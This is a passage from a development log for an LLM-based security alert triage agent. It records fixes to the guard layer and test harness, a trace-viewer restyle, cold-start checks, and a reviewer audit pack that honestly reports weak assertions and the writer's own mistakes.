4xx responses now log the full body plus request shape (model, max_tokens,
message count, tool count, body bytes) rather than a 1200-char slice. **The S4
400 did not recur across four subsequent full runs**, so candidate (a) - guard
(b) inflating reconsideration context - remains untested rather than ruled out.
Stated as untested.

### K-3 - The sandbox lock had a race, found by repeating my own mistake

Verification run B died after scenario 1 with exit 0 and no table. Cause: I ran
`selfcheck.py` concurrently - the P-017 mistake a second time - **and the guard
built to prevent exactly that did not stop me**.

`reset_sandbox()` does `rmtree` on `fixtures/run`, which is where the lock lived.
The lock therefore deleted itself between scenarios, leaving an unlocked window
in which a concurrent process saw no lock and proceeded. **A lock cannot live in
the directory it protects.** It now sits at `ROOT/.soc_run.lock`, survives its
own process's reset, and blocks a second process - verified cross-process.

Three strikes on the same behaviour (P-014, P-017, K-3). The behavioural fix is
chaining both runs into one command, so there is no window in which running
something alongside is even possible.

### K-4 - Guard (b) is a fourth family, with three properties worth stating

`check_sibling_verdict_conflict` is split out, being the first guard whose input
is an **agent conclusion** rather than bookkeeping:

- **order-dependent** - fires only if the sibling concluded first; reverse the
  order and it is silent
- **error-propagating** - a sibling that wrongly concluded `SUCCEEDED` constrains
  this case, inheriting the earlier mistake rather than catching it
- **SUCCEEDED only** - an `INCONCLUSIVE` sibling does not fire it, *including one
  that triggered a precautionary block*, because containment under uncertainty is
  explicitly not a finding of breach (7.3). Verified: `SUCCEEDED` fires;
  `INCONCLUSIVE`, `FAILED` and unconcluded do not.

Four families ablate independently: preconditions **9**, coverage **2**,
negative-scope **7**, sibling-verdict **2**, restored **0**.

### K-5 - The refuse/resubmit cycle is bounded

After `MAX_ASSESSMENT_REJECTIONS` (3) the bus stops arguing: it drops every
factor the guards named, accepts what survives, and records the impasse. Terminal
by construction - accepting directly rather than re-dispatching, because
`submit_assessment` refuses an empty factor list and re-dispatching would loop to
the turn cap. An impasse that drops everything scores the bare 0.50 base, the
honest outcome when nothing claimed can stand. Reports gained an Impasse section
so it cannot vanish into a low score.

### K-6 - Point 3 discharged: two consecutive green full runs

Both **51/51**, exit 0, chained in one command with nothing run alongside.

| # | Checks |
|---|---|
| 1 | 8/8 |
| 2 | 7/7 |
| 3 | 11/11 |
| 4 | 6/6 |
| 5 | 9/9 |
| 6 | 10/10 |

Model is `ling-3.0-flash-fin-free`, not DeepSeek - DeepSeek became credit
exhausted mid-session (429 Insufficient credits, while the token quota stood at
99M of 100M, so a per-model limit rather than the account). The guards are
structural and model-independent, but the traces say Ling.

### K-7 - S5 case A takes the logs_consistent path (read, not assumed)

Point 6. The live trace shows case A reconsidering to `SUCCEEDED` **0.95** via
`version_in_range + logs_consistent + related_alert_corroborates +
exfil_indicators` - the wider-margin path, not the 0.80 drop path.

`compliance.py` now asserts **both** honest paths clear 0.75 (0.80 and 0.95), so
the scenario is no longer sign-flippable, plus a floor on the thinner path's
margin so a future factor change cannot erode it silently.

**Known limitation found while reading it:** case A declares `exfil_indicators`
citing **ALERT-5002's** packet record - a sibling's flow. The provenance guard
requires the case to have *read* its own alert's flow (it did); it does not
require the *citation* to be that flow. I had described it as the latter. No
outcome impact - 1.30 and 1.15 both clamp to 0.95. Recorded rather than patched:
a fifth guard here is unbudgeted risk against a passing suite, and there is
genuine tension with the campaign framing, which tells the agent to reason about
the asset rather than the single packet.

### K-8 - Point 7: DEMO.md claims only what the artefacts contain

Checked which refusal scopes actually appear in the committed traces:

| demonstrated live | scenarios |
|---|---|
| service coverage | 1, 3, 4, 5 |
| log window | 6 |
| precondition | 2, 3, 4, 5, 6 |

**Not present in any trace:** related-alert window, sibling verdict, packet
provenance. They are verified by `selfcheck.py` and did not need to fire, because
the agent declared an acceptable factor set first time.

`DEMO.md` says exactly that, and instructs saying *structurally verified, not
exercised in this run* rather than implying a trace shows them. Asserting a scope
in the script that is absent from the artefact is precisely the failure point 7
exists to prevent.

Final: **99/99** behavioural, **22/22** guardrail, six scenarios green on 51
assertions across two consecutive runs.

---

## Part 17 - Viewer restyle: which template, which animations, and why

Two references were supplied: `uupm.cc` (UI/UX Pro Max) and `motion.dev`.

### L-1 - The style choice contradicts the demo gallery, deliberately

`uupm.cc` is the site for the UI/UX Pro Max skill, which is installed locally, so
the style was resolved from its database rather than eyeballed from the gallery.
Query: security operations dashboard, dark, timeline, with dials
`--variance 3 --motion 4 --density 9`.

Result: **Minimalism & Swiss Style** - *"Best for: Enterprise apps, dashboards,
documentation sites, SaaS platforms, professional tools"*, performance cost
**low**, accessibility risk **low**.

That is **not** what the gallery showcases. Its dark demos are Glassmorphism and
Liquid Glass. Those were rejected on purpose: backdrop blur behind dense
monospace costs legibility on a projector, adds paint cost on a page that
renders 383 nodes, and buys nothing for a trace viewer whose whole job is
reading small text accurately.

Palette adopted: the "vault dark blue + secure green" security profile -
`#0F172A` ground, `#192134` cards, `rgba(255,255,255,.08)` borders, `#94A3B8`
muted text. Typeface Inter, with a full system fallback stack so an offline
demo degrades rather than breaks.

### L-2 - Motion is vendored, not CDN-loaded

`motion.dev` supports a plain `<script>` tag, so it clears CLAUDE.md section 10
(no framework, no build step). But the CDN form was rejected: the demo runs from
a local `http.server` and a venue without internet would leave `Motion`
undefined mid-demo. `vendor/motion.js` is pinned at 12.23.12 (81 KB) and
committed. The viewer now has **zero external references** - verified.

### L-3 - The animation budget is two elements, from the database

The same database returns *"Animate 1-2 key elements per view maximum"* and
*"Respect prefers-reduced-motion"*, both **High** severity. So exactly two things
move: the card being revealed, and - when one appears - a reconsideration fork or
a guard refusal. `prefers-reduced-motion` skips all of it.

Timing matches the database's Stagger List preset (300-450ms). Staggering applies
only to *Show all*; during playback a single card animates immediately so it
stays in step with the existing 400ms cadence rather than fighting it.

### L-4 - A bug I introduced and caught by measuring, not by looking

The first implementation had `enter()` animate `opacity: [0, 1]` through Motion.
That is wrong, and the headless screenshot proved it: page content collapsed from
**8980px to 770px** - most of the trace invisible.

Cause: `.step.on` already fades the card in via CSS. Driving opacity from 0 a
second time through Motion means that if the animation does not run or complete -
a stalled rAF, a missing vendor file, a headless renderer - the card sits at
opacity 0 with the class correctly set. **It failed closed, hiding evidence.**

`enter()` now animates movement only (`x` / `y`). CSS owns visibility. Remove
Motion entirely and the viewer still reveals every card. That is the right shape
for an enhancement layer, and it is the second time in this project that
measuring output rather than trusting it caught something a glance would not.

### L-5 - Rail markers now carry shape, not just hue

The database flags *"Don't convey information by colour alone"* as **High**
severity. Card labels always named the kind in words, so the cards complied - but
the timeline rail markers were hue-only. They now encode shape as well:

| marker | kind |
|---|---|
| bar | phase change |
| square | failure / error |
| diamond | scoring, conclusion, refusal |
| hollow ring | reconsideration fork |
| dot | everything else |

So the rail survives greyscale, projector colour shift, and colour-blind
viewers. The marker reinforces the label; it is never the only signal.

Verified after every change: **383 trace steps render, 0 failures**, 99/99
behavioural, 22/22 guardrail.

---

## Part 18 - Delivery pass

### M-1 - Refusal density measured; the disconfirmation turn is NOT needed

The review gated a §7.4 build on refusal counts: 3+ on correlated cases means
the timeline reads as a model on a leash. Measured across all six traces:

| case | refusals / tool calls |
|---|---|
| CASE-1001 | 1 / 11 |
| CASE-2001 | 2 / 11 |
| CASE-3001 | 3 / 34 |
| CASE-4001 | 2 / 12 |
| **CASE-5001** (correlated) | **2 / 22** |
| **CASE-5002** (correlated) | **0 / 10** |
| CASE-6001 | 1 / 13 |

The correlated cases sit at **2 and 0** - below the threshold. CASE-3001 reaches
3, but across 34 calls (8.8%), a lower density than CASE-2001 or CASE-4001.
**Decision: skip the item.**

**The premise was also wrong.** §7.4 is not unbuilt. The system prompt instructs
falsification, `submit_assessment` carries
`disconfirming_evidence_checked`, and **8 of 9 conclusions populate it** with
real content. It was implemented as part of the assessment rather than as a
separate turn, which is why it did not look like a distinct step. Two independent
reasons not to build it; recorded so it is not raised a third time.

### M-2 - The "clipped card" is not CSS, and the first two diagnoses were wrong

The review spotted `"and data was exfiltr"` on the Scenario 6 screen and
attributed it to card clipping. Three hypotheses, checked in order:

1. **CSS clipping** - no. The cut is present in the trace JSON itself, so the
   viewer renders faithfully. The only `max-height` is on the collapsed payload
   `<pre>`, and `overflow-x:auto` makes `overflow-y` compute to `auto`, so it
   scrolls. (Made explicit anyway.)
2. **`max_tokens`** - no. The truncating turns total 35-1471 tokens against a
   4096 cap, and several precede 25-character tool calls.
3. **My own detector** - partly wrong. It flagged 23 of 93 tool-call reasons as
   truncated on "does not end with punctuation". Reading them showed they are
   complete sentences without a full stop: *"…and severity"*, *"…affected
   range"*. Only a couple are genuinely mid-word.

Actual state: **0 of 83 structured fields truncated.** Every hypothesis,
sufficiency statement, disconfirmation, citation and rationale - everything the
report renders in section 3 - is complete. A small number of interstitial
narrations are cut by the model as it switches to a tool call.

`stop_reason` is now recorded on every narration step, so a future occurrence is
diagnosable from the trace rather than requiring this whole exercise. That it was
parsed but never logged was the real gap.

### M-3 - README rebuilt as an entry point

Not a build log. Opens with what it does, then a **Start here** section carrying
the one frame that proves the 25% criterion - tool chosen, reason given, result,
next decision - a direct pointer to `reports/CASE-1001.md` section 2 steps 8-10,
and the guard rule in three sentences ending *"will not accept 'outside all
affected ranges' from someone who checked some of them"*.

### M-4 - Demo reordered to open on autonomy

Scenario 6's ceiling is the strongest single frame, and it proves a **10%**
criterion already maxed. Autonomy is **25%** and needs a different frame: tool →
stated reason → result → next decision. The demo now opens there and arrives at
the ceiling as payoff. Order 1 → 2 → 3 → 6.

### M-5 - Robustness follow-up swapped

Promoted above the ablation counts: four times a verification tool produced a
**plausible wrong answer** - regex ablation mis-attribution, an invariant
"verified" by reading that was never asserted, a lock that deleted itself by
living in the directory it protected, and a coherence check printing a
hard-coded label over a wrong span. None was caught by a suite going red; all
four by re-reading output instead of the summary. That answers "how do you know
your evals are sound" better than any pass count.

### M-6 - Cold start: 7 seconds, and it caught a missing asset

Fresh clone, no cache, no server, **97% memory / 0.38 GB free**:

| step | time |
|---|---|
| clone | 1s |
| `compliance.py` | 2s |
| `selfcheck.py` | 1s |
| viewer served (200 on page, trace and motion) | 3s |
| **total** | **7s** |

The clone passed 99/99 and 22/22, carried all 6 traces and 7 reports, and
correctly had **no `.env`**. It also revealed `docs/viewer.png` existed locally
but was uncommitted - the README's lead image would have 404'd for anyone
cloning. That is exactly the class of failure a cold-start rehearsal exists to
find, and no amount of local testing would have shown it.

### M-7 - Item 1 completed properly: demand-resolution sweep

The first pass on item 1 checked the CSS rules and stopped there. The instruction
was to *"check every long-text card at demo resolution, not just that one"*, and
that was not done - a gap only found by re-auditing the block rather than
trusting the earlier report.

Done now: every text block over 400 characters, across all six scenarios, at
**1920x1080** and **1366x768**, compared against the trace source to its final
character via the rendered DOM.

**52 / 52 intact at both resolutions. No clipping anywhere.**

Two false alarms along the way, both mine:

1. A first comparison reported 6/7 "clipping". The failing block contained
   `**bold**` and backticked text, which `md()` converts to `<strong>` and
   `<code>` - my matcher compared against raw markdown and missed.
2. Correcting that, tags were stripped by replacing them with a *space*, which
   split contiguous phrases like `` `192.0.2.66`. The case `` and still reported
   a false positive.

Stripping tags with no replacement gives 52/52. Worth recording because both
intermediate results looked like real defects and would have justified "fixing"
a viewer that was never broken - the same plausible-wrong-answer failure mode
already logged four times in this project, now five.

---

## Part 19 — scoring/ audit pack (reviewer-facing)

**N-1. Why the folder exists.** A reviewer asked for four artefacts to check
claims instead of taking them on faith: a full trace (not the cleanest), the
agent loop source, the guard/ToolBus source, and the harness plus assertion
file. Built as `scoring/` with a README that answers each question inline.

**N-2. Which trace, and why that one.** Measured refusal density across all six
before choosing, rather than picking by feel: S1 11 calls/1 refusal, S2 11/2,
S3 34/3 + reconsideration, S4 12/2, S5 32/2 + 2 cases, S6 13/1. Shipped S3 —
the least flattering on refusal count, which is the metric the reviewer wanted
to audit. Shipping S1 would have been the flattering choice and would have made
the refusal question unanswerable.

**P-020. Copied source can drift from the original it claims to be.** `scoring/src/`
holds byte copies of files that live elsewhere. Nothing stops an edit to an
original from leaving the copy stale, and a stale copy is worse than no copy:
the reviewer audits code the agent does not run. Added five equality checks to
`selfcheck.py` (99 -> 105 including the trace-present check) and proved they
fire by appending a line to `scoring/src/toolbus.py`: 104/105, "STALE - re-copy
it". Restored, 105/105. The trace copy is deliberately NOT byte-checked — a
live run rewrites `traces/scenario_3.json`, so divergence there is expected, not
drift; it is pinned by the run named in the README instead.

**N-3. The luck-vs-reasoning question, answered with a real trace.** The ask was
whether a badly-reasoning trajectory that lands on the right factor by luck
actually fails the assertions. Rather than construct a strawman, pulled the real
P-016 trajectory out of `git show ee50c21:traces/scenario_3.json`: correct final
outcome (SUCCEEDED) reached with a wrong T0 verdict (FAILED where the spec says
INCONCLUSIVE) and only `tomcat` looked up before concluding, on a SQLi alert
against a host running mysql 5.7.28 which IS in range.
`scoring/test_luck_vs_reasoning.py` replays it through `run_all._check` itself,
no mocking. Result: the old bar passes it 4/4; the current bar fails it on two —
the phase-scoped `get_vulnerabilities(service_name='mysql')` *before concluding*
(a whole-trace search does NOT catch it, since the call did eventually happen)
and `initial_outcome == INCONCLUSIVE`.

**N-4. Reported the assertion that does NOT catch it.** `required factors
established` passes the bad trajectory. Factor presence alone does not separate
luck from reasoning; phase scoping and pinned intermediate states do. Said so in
the README rather than listing only the two that landed.

**N-5. Counted the cheap assertions instead of hand-waving.** First draft of the
README said "a substantial share of the suite" is coarse. Replaced with a census
computed from the six shipped traces: 51 live assertions, 30 coarse (58%), 21
path-pinning (41%); scenario 4 is weakest at one path-pinning check. The census
runs in the same script so the reviewer can reproduce it. 58% is not a
flattering number and is stated as the number to discount the pass count by.

**N-6. Made the "guards never read content" claim grep-checkable.** The claim
was going to be "search for citation, it appears in no guard body" — but
`confidence.py` returns two hits (a docstring at :286, a pass-through into the
report inside `score()` at :312). A reviewer running that grep would have found
them and reasonably concluded the claim was evasive. Rewrote it to name both
hits and why neither is a guard. Also disambiguated the two pass counts in
circulation: 51 is the live harness, 105 is offline `selfcheck.py`; they are not
additive.
